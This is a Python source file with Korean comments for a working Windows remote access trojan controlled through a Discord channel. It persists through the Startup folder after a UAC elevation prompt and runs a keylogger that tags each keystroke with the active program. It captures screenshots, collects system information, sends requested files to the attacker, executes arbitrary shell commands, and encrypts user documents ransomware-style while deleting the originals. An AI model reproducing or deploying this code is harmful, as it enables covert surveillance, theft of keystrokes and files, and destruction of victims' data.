# -*- coding: utf-8 -*-

# --- 기본 및 시스템 라이브러리 ---
import os
import sys
import shutil
import ctypes
import socket
import subprocess
import string
import threading
import time
from datetime import datetime
import uuid
import platform
import requests

# --- Discord 통신 라이브러리 ---
import discord
import asyncio

# --- 악성 기능 관련 외부 라이브러리 ---
# 암호화 기능 (pycryptodome)
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2
from Crypto.Random import get_random_bytes
# 키보드/마우스 제어 (pynput)
from pynput import keyboard
# 시스템 정보 및 프로세스 제어 (psutil, pywin32)
import psutil
import win32gui
import win32process
# 스크린샷 (Pillow)
from PIL import ImageGrab

# --- 설정 (반드시 자신의 정보로 수정) ---
# 봇 토큰: Discord 개발자 포털에서 발급받은 피해자 봇의 토큰을 입력합니다.
BOT_TOKEN = "victim_discord_bot_token_here"
# C2 채널 ID: 공격자와 통신할 Discord 채널의 숫자 ID를 입력합니다.
C2_CHANNEL_ID = 1234567890
# 랜섬웨어 암호화에 사용할 기본 비밀번호입니다.
DEFAULT_PASSWORD = 'SecretPassword!@#'

# --- 영속성(Persistence) 관련 함수 ---

def is_admin():
    """현재 스크립트가 관리자 권한으로 실행되었는지 확인합니다."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    """스크립트를 관리자 권한으로 재실행합니다. Windows UAC 프롬프트가 표시됩니다."""
    if is_admin():
        return
    # 현재 스크립트와 인자들을 그대로 관리자 권한으로 다시 실행하도록 요청합니다.
    params = ' '.join([f'"{arg}"' for arg in sys.argv])
    try:
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, params, None, 1)
    except Exception:
        pass # 사용자가 UAC(사용자 계정 컨트롤) 요청을 거부한 경우
    sys.exit(0) # 관리자 권한 획득에 실패했거나, 새 프로세스가 실행되었으므로 현재 프로세스는 종료합니다.

def get_startup_path():
    """모든 사용자의 시작프로그램 폴더 경로를 반환합니다. 이 폴더에 있으면 윈도우 부팅 시 자동 실행됩니다."""
    return os.path.join(os.environ['ProgramData'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'StartUp', os.path.basename(sys.argv[0]))

def in_startup():
    """현재 스크립트가 시작프로그램 폴더에 위치하는지 확인합니다."""
    try:
        # 현재 실행 파일의 절대 경로와 시작프로그램 폴더의 경로를 비교합니다.
        return os.path.abspath(sys.argv[0]).lower() == get_startup_path().lower()
    except Exception:
        return False

def persist():
    """영속성 확보 메인 로직. 시작프로그램 폴더에 없으면 관리자 권한 획득 후 자신을 복사합니다."""
    if in_startup():
        return # 이미 시작프로그램에 있으므로 아무것도 하지 않습니다.
    
    if not is_admin():
        run_as_admin() # 관리자 권한이 없으면 획득을 시도합니다. (이후 프로세스는 종료됨)
    
    target_path = get_startup_path()
    if not os.path.exists(target_path):
        try:
            # 현재 실행 파일을 시작프로그램 폴더로 복사합니다.
            shutil.copy2(sys.executable, target_path)
            # 복사된 파일을 즉시 실행하여 제어권을 넘깁니다.
            os.startfile(target_path)
            sys.exit(0) # 현재 프로세스는 임무를 마쳤으므로 종료합니다.
        except Exception:
            pass # 복사 실패 시 예외 처리

# --- 키로깅(Keylogging) 관련 변수 및 함수 ---
key_log = [] # 키 입력 로그를 저장하는 리스트
keylog_lock = threading.Lock() # 멀티스레드 환경에서 key_log 접근을 동기화하기 위한 락
keylog_running = threading.Event() # 키로거 스레드의 실행/중지 상태를 제어하는 이벤트 객체
keylog_thread = None # 키로거 스레드 객체를 저장할 변수

def get_active_window_process():
    """현재 사용자가 보고 있는 활성 창의 프로세스 이름을 가져옵니다."""
    try:
        hwnd = win32gui.GetForegroundWindow()
        _, pid = win32process.GetWindowThreadProcessId(hwnd)
        return psutil.Process(pid).name()
    except Exception:
        return "unknown"

def on_press(key):
    """키보드 입력이 감지될 때마다 pynput 리스너에 의해 호출되는 콜백 함수."""
    # 어떤 프로세스에서 키 입력이 발생했는지 기록합니다.
    process_name = get_active_window_process()
    # 키 정보를 문자열로 변환합니다. (예: 'a', 'Key.space', 'Key.ctrl_l')
    key_str = str(key.char) if hasattr(key, 'char') and key.char else str(key)
    log_line = f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{process_name}] {key_str}"
    
    with keylog_lock: # 스레드 충돌 방지
        key_log.append(log_line)
    
    # keylog_running 이벤트가 clear되면(중지 신호), 리스너 스레드가 종료되도록 False를 반환합니다.
    if not keylog_running.is_set():
        return False

def keylogger_thread_func():
    """pynput 리스너를 실행하고 키 입력을 감지하는 스레드 함수."""
    global key_log
    key_log = [] # 스레드 시작 시 로그 초기화
    keylog_running.set() # 키로거 실행 상태로 설정
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join() # 리스너가 종료될 때까지(on_press에서 False 반환) 대기합니다.

def start_keylogger():
    """키로깅 스레드를 시작합니다."""
    global keylog_thread
    if keylog_running.is_set():
        return False # 이미 실행 중이면 False 반환
    keylog_thread = threading.Thread(target=keylogger_thread_func, daemon=True)
    keylog_thread.start()
    return True

def stop_keylogger():
    """키로깅 스레드를 중지시키고, 기록된 로그를 반환합니다."""
    if keylog_running.is_set():
        keylog_running.clear() # 중지 신호 설정
        # 리스너 스레드가 블록 상태에서 빠져나오도록 가상 키 입력을 발생시킵니다.
        try:
            controller = keyboard.Controller()
            controller.press(keyboard.Key.ctrl); controller.release(keyboard.Key.ctrl)
        except Exception: pass
        if keylog_thread:
            keylog_thread.join(timeout=1) # 스레드가 종료될 때까지 최대 1초 대기
    
    with keylog_lock:
        return "\n".join(key_log)

# --- 기타 악성 기능 함수 ---

def capture_screenshot():
    """전체 화면 스크린샷을 찍어 임시 파일로 저장하고 그 경로를 반환합니다."""
    try:
        path = os.path.join(os.environ.get("TEMP", "C:\\Windows\\Temp"), f"ss_{uuid.uuid4()}.png")
        ImageGrab.grab().save(path)
        return path
    except Exception:
        return None

def get_sysinfo():
    """시스템의 주요 정보를 수집하여 문자열로 반환합니다."""
    try:
        info = [
            f"Hostname:     {socket.gethostname()}",
            f"Username:     {os.getlogin()}",
            f"OS:           {platform.platform()}",
            f"Architecture: {platform.machine()}",
            f"Processor:    {platform.processor()}",
            f"RAM:          {round(psutil.virtual_memory().total / (1024**3), 2)} GB"
        ]
        for nic, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    info.append(f"Interface {nic}: {addr.address}")
        return '\n'.join(info)
    except Exception as e:
        return f"[!] Failed to get system info: {e}"

def resolve_new_dir(base, target):
    """'cd' 명령어의 경로를 해석합니다. (상대/절대 경로, '..', '.' 등 처리)"""
    if target in ['.', '']:
        return base
    if target == '..':
        return os.path.dirname(base.rstrip("\\/"))
    # 경로가 드라이브 문자로 시작하거나 UNC 경로이면 절대 경로로 취급합니다.
    if os.path.isabs(target):
        return os.path.abspath(target)
    else:
        return os.path.abspath(os.path.join(base, target))

# --- 랜섬웨어(Ransomware) 관련 함수 ---
EXCLUDE_DIRS = [r"C:\Windows", r"C:\Program Files", r"C:\Program Files (x86)", r"C:\$Recycle.Bin", r"C:\ProgramData"]
TARGET_EXTS = {'.txt', '.rtf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.hwp', '.jpg', '.jpeg', '.png', '.gif', '.mp3', '.mp4', '.avi', '.zip', '.rar', '.7z', '.sql', '.py', '.java', '.c', '.cpp', '.cs', '.html', '.css', '.js'}

def should_exclude_dir(path):
    """암호화에서 제외할 디렉토리인지 확인합니다."""
    path_lower = os.path.abspath(path).lower()
    return any(path_lower.startswith(ex.lower()) for ex in EXCLUDE_DIRS)

def should_encrypt(file_path):
    """파일 확장자를 보고 암호화 대상인지 확인합니다."""
    return os.path.splitext(file_path)[1].lower() in TARGET_EXTS

def encrypt_file(path):
    """AES-256-CBC를 사용하여 단일 파일을 암호화하고 원본 파일을 삭제합니다."""
    if path.lower().endswith('.enc'):
        return f"[+] Already encrypted: {path}"
    try:
        salt = get_random_bytes(16) # 암호화 키를 생성하기 위한 솔트
        key = PBKDF2(DEFAULT_PASSWORD, salt, dkLen=32) # 패스워드 기반 키 생성
        iv = get_random_bytes(16) # 초기화 벡터
        cipher = AES.new(key, AES.MODE_CBC, iv)
        
        with open(path, 'rb') as f:
            data = f.read()
        
        # AES 블록 크기(16바이트)에 맞게 패딩 추가
        pad_len = 16 - (len(data) % 16)
        data += bytes([pad_len]) * pad_len
        
        ciphertext = cipher.encrypt(data)
        out_path = path + '.enc'
        
        # 암호화된 파일 형식: [16바이트 salt][16바이트 IV][암호문]
        with open(out_path, 'wb') as f:
            f.write(salt + iv + ciphertext)
        
        os.remove(path) # 원본 파일 삭제
        return f"[+] Encrypted: {out_path}"
    except Exception as e:
        return f"[!] Encryption failed for {path}: {e}"

def decrypt_file(path):
    """암호화된 단일 파일을 복호화하고 .enc 파일을 삭제합니다."""
    if not path.lower().endswith('.enc'):
        return f"[!] Not an encrypted file: {path}"
    try:
        with open(path, 'rb') as f:
            salt, iv, ciphertext = f.read(16), f.read(16), f.read()
            
        key = PBKDF2(DEFAULT_PASSWORD, salt, dkLen=32)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        
        data = cipher.decrypt(ciphertext)
        
        # 패딩 제거
        pad_len = data[-1]
        data = data[:-pad_len]
        
        out_path = path[:-4] # .enc 확장자 제거
        with open(out_path, 'wb') as f:
            f.write(data)
            
        os.remove(path) # .enc 파일 삭제
        return f"[+] Decrypted: {out_path}"
    except Exception as e:
        return f"[!] Decryption failed for {path}: {e}"

def process_path(target_path, func):
    """주어진 경로에 대해 암호화 또는 복호화 함수를 재귀적으로 적용합니다."""
    results = []
    if os.path.isfile(target_path):
        if (func == encrypt_file and should_encrypt(target_path)) or (func == decrypt_file and target_path.lower().endswith('.enc')):
            results.append(func(target_path))
    elif os.path.isdir(target_path):
        for root, _, files in os.walk(target_path):
            if should_exclude_dir(root):
                continue
            for fname in files:
                fpath = os.path.join(root, fname)
                if (func == encrypt_file and should_encrypt(fpath)) or (func == decrypt_file and fpath.lower().endswith('.enc')):
                    results.append(func(fpath))
    return '\n'.join(results) if results else "[!] No target files found."

# --- Discord 통신 로직 ---

# 봇이 서버의 메시지 내용을 읽을 수 있도록 message_content 인텐트를 활성화합니다.
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)

victim_id_str = None # 이 봇의 고유 ID ('ip:uuid')
current_dir = os.getcwd() # 원격 쉘의 현재 작업 디렉토리

def get_public_ip():
    """외부 서비스를 이용해 자신의 공인 IP 주소를 가져옵니다."""
    try:
        return requests.get('https://api.ipify.org', timeout=3).text
    except Exception:
        return "Unknown_IP"

async def send_result(channel, text_result=None, file_path=None):
    """명령 실행 결과를 C2 채널로 전송합니다. 텍스트가 길면 분할 전송합니다."""
    if not channel:
        return
    header = f"```Response from {victim_id_str}:\n"
    footer = "```"
    if text_result:
        # Discord 메시지 길이 제한(2000자)에 맞춰 메시지를 분할하여 전송합니다.
        full_message = str(text_result)
        for i in range(0, len(full_message), 1900):
            chunk = full_message[i:i+1900]
            await channel.send(header + chunk + footer)
    if file_path and os.path.exists(file_path):
        try:
            # 파일 이름이 겹치지 않도록 현재 시간을 이용해 새 파일 이름을 만듭니다.
            now = datetime.now().strftime("%Y-%m-%d-%H-%M-%S")
            _, ext = os.path.splitext(file_path)
            new_filename = f"{now}{ext}"
            await channel.send(file=discord.File(file_path, filename=new_filename))
        except Exception as e:
            await channel.send(f"```{victim_id_str} file upload error: {e}```")
        finally:
            # 임시 파일(스크린샷, 키로그)은 전송 후 삭제하여 흔적을 남기지 않습니다.
            if file_path.startswith(os.environ.get("TEMP", "")):
                os.remove(file_path)

@client.event
async def on_ready():
    """봇이 준비되면 C2 채널에 자신의 고유 ID를 보내 '체크인'합니다."""
    global victim_id_str
    channel = client.get_channel(C2_CHANNEL_ID)
    if channel:
        victim_id_str = f"{get_public_ip()}:{uuid.uuid4()}"
        # 자신의 ID를 백틱(`)으로 감싸서 공격자 콘솔에서 쉽게 복사할 수 있도록 합니다.
        await channel.send(f"`{victim_id_str}`")

@client.event
async def on_message(message):
    """C2 채널에 메시지가 올라오면, 자신에게 온 명령인지 판단하고 처리합니다."""
    global current_dir
    
    # C2 채널이 아니거나, 자기 자신이 보낸 메시지(결과 보고 등)는 무시합니다.
    if message.channel.id != C2_CHANNEL_ID or message.author == client.user:
        return

    full_command = message.content.strip()

    # 'refresh'는 모든 피해자가 응답해야 하는 공용 명령어입니다.
    if full_command.lower() == 'refresh':
        await message.channel.send(f"`{victim_id_str}`")
        return
        
    # 메시지가 자신의 ID로 시작하지 않으면, 자신에게 온 명령이 아니므로 무시합니다.
    if not full_command.startswith(victim_id_str):
        return
    
    # 명령어 부분만 추출합니다. (예: "id sysinfo" -> "sysinfo")
    try:
        command = full_command.split(maxsplit=1)[1]
    except IndexError: # ID만 있고 명령어가 없는 경우는 무시합니다.
        return
        
    # --- 명령어 실행 분기 ---
    result_text, result_file = None, None

    if command == "sysinfo":
        result_text = get_sysinfo()
    elif command == "screenshot":
        result_file = capture_screenshot()
        if not result_file:
            result_text = "[!] Screenshot capture failed."
    elif command == "keylogging":
        result_text = "[+] Keylogging started." if start_keylogger() else "[!] Keylogger is already running."
    elif command == "stop keylogging":
        log_data = stop_keylogger()
        if log_data:
            # 로그 데이터를 임시 파일로 저장하여 전송 준비
            temp_path = os.path.join(os.environ.get("TEMP", "."), f"kl_{uuid.uuid4()}.txt")
            with open(temp_path, "w", encoding="utf-8") as f:
                f.write(log_data)
            result_file = temp_path
        else:
            result_text = "[+] Keylog stopped. No logs were recorded."
    elif command.startswith("download "):
        path = command.split(maxsplit=1)[1].strip('"')
        if os.path.isfile(path):
            result_file = path
        else:
            result_text = f"[!] File not found: {path}"
    elif command.startswith('cd '):
        try:
            new_dir = resolve_new_dir(current_dir, command.split(maxsplit=1)[1].strip('"'))
            if os.path.isdir(new_dir):
                current_dir = new_dir
                result_text = f"Changed directory to: {current_dir}"
            else:
                result_text = f"[!] Directory not found: {new_dir}"
        except Exception as e:
            result_text = f"[!] 'cd' command error: {e}"
    elif command == 'pwd':
        result_text = current_dir
    elif command.startswith('encrypt'):
        path_to_process = command.split(maxsplit=1)[1].strip('"') if len(command.split()) > 1 else '.'
        result_text = process_path(path_to_process, encrypt_file)
    elif command.startswith('decrypt'):
        path_to_process = command.split(maxsplit=1)[1].strip('"') if len(command.split()) > 1 else '.'
        result_text = process_path(path_to_process, decrypt_file)
    else:
        # 위에서 처리되지 않은 모든 명령어는 시스템 쉘을 통해 실행합니다.
        try:
            # 'shell=True'는 보안에 취약할 수 있으나, 원격 쉘 기능 구현을 위해 사용합니다.
            ps = subprocess.run(command, shell=True, cwd=current_dir, capture_output=True, text=True, timeout=30, encoding='cp949', errors='replace')
            output = (ps.stdout + ps.stderr).strip()
            result_text = output if output else '[No Output]'
        except subprocess.TimeoutExpired:
            result_text = '[Error] Command timed out after 30 seconds.'
        except Exception as e:
            result_text = f"[Error] Shell command execution failed: {e}"

    # 파일 경로가 반환되었지만 실제 파일이 없는 경우, 텍스트 결과로 처리합니다.
    if isinstance(result_file, str) and not os.path.exists(result_file):
        result_text, result_file = result_file, None
    
    # 최종 결과를 C2 채널로 전송합니다.
    await send_result(message.channel, text_result=result_text, file_path=result_file)

def main():

    # 귀찮아서 persist()안넣었습니다. 그대신 downloader를 사용하세요.

    # 봇이 예기치 않게 종료되거나 네트워크 연결이 끊겨도 계속 재시도하도록 무한 루프를 사용합니다.
    while True:
        try:
            client.run(BOT_TOKEN)
        except discord.errors.LoginFailure:
            # 토큰이 잘못된 경우, 재시도는 의미가 없으므로 10분 대기합니다.
            time.sleep(600)
        except Exception:
            # 그 외 모든 네트워크 오류 등의 예외 발생 시 10초 후 재연결을 시도합니다.
            time.sleep(10)

if __name__ == '__main__':
    main()